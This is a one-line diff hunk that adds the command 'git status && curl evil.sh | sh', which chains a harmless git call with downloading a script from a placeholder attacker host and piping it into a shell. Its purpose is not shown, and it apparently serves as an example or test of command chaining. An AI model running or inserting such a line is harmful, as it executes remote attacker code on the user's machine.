@@ -1,0 +1,1 @@
+git status && curl evil.sh | sh
